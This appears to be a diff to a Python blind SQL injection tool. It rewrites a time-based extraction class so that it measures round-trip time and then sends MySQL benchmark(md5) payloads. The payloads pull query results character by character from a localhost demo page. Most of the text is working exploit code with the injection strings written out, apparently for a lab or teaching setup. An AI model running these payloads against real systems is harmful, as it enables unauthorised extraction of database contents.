@@ -17,34 +17,27 @@ class SimpleDuncan(duncan.Duncan): # Inherit from Duncan
 		else:
 			return False
 
-class SimpleTimeBasedDuncan(duncan.DuncanTime):
+class TimeBasedDuncan(duncan.DuncanTime):
 	def decide(self,guess):
-		import time
+		import time,math
 
-		self._rttmax=3 # this hint can be useful
-		self._rttmin=1
+		# Initial RTT measurement - maybe we could move this to the base class
+		if self._rttmax==0:
+			for _ in xrange(0,10):
+				t0=time.time()
+				requests.get("http://localhost/demo/sqli/time.php?p=1")
+				t1=time.time()
+				self.update_rtt(t1-t0)
+			self._sleep=(self._rttmax-self._rttmin)*1.2
+			self._threshold=self._rttmin+self._sleep
 
 		t0=time.time()
-		url="http://localhost/demo/sqli/time.php?p=1 and case when ord(substr((%s),%d,1))<%d then sleep(3) else 1 end" % (self._query,self._pos,guess)
+		url="http://localhost/demo/sqli/time.php?p=1 and case when ord(substr((%s),%d,1))<%d then benchmark(%d,md5(1)) else 1 end" % (self._query,self._pos,guess,math.ceil((self._sleep/0.1)*450000)) # Mesure first!
 		self.debug(6,url)
 		r=requests.get(url)
 		t1=time.time()
 		self.debug(6, "Guess: %d, Time: %f" % (guess,t1-t0))
-		if t1-t0>2:
-			return True
-		else:
-			return False
-
-class NaiveTimeBasedDuncan(duncan.Duncan):
-	def decide(self,guess):
-		import time
-		t0=time.time()
-		url="http://localhost/demo/sqli/time.php?p=1 and case when ord(substr((%s),%d,1))<%d then sleep(3) else 1 end" % (self._query,self._pos,guess)
-		self.debug(6,url)
-		r=requests.get(url)
-		t1=time.time()
-		self.debug(6, "Guess: %d, Time: %f" % (guess,t1-t0))
-		if t1-t0>2:
+		if t1-t0>self._threshold:
 			return True
 		else:
 			return False
